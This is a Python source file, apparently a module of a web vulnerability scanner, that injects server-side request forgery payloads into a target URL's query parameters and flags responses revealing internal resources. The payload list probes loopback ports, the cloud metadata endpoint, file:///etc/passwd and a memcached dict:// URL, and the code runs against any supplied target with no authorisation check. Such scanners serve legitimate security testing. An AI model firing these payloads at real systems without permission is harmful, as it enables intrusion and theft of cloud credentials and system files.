from typing import Optional
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://localhost:22",
    "http://169.254.169.254/latest/meta-data/",
    "http://0.0.0.0:80",
    "http://[::1]:80",
    "file:///etc/passwd",
    "dict://localhost:11211/",
]


async def run(target: str, scan_id: Optional[int] = None) -> list[dict]:
    results = []
    url = f"https://{target}" if not target.startswith("http") else target
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        params = {"url": [""], "dest": [""], "redirect": [""], "uri": [""]}

    async with aiohttp.ClientSession() as session:
        for param, values in params.items():
            for payload in SSRF_PAYLOADS:
                try:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_qs = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_qs))
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        text = await resp.text()
                        if "root:" in text or "ami-id" in text or "meta-data" in text:
                            results.append({
                                "finding_type": "SSRF",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"Internal resource accessible via {payload}",
                            })
                            break
                except Exception:
                    pass
    return results
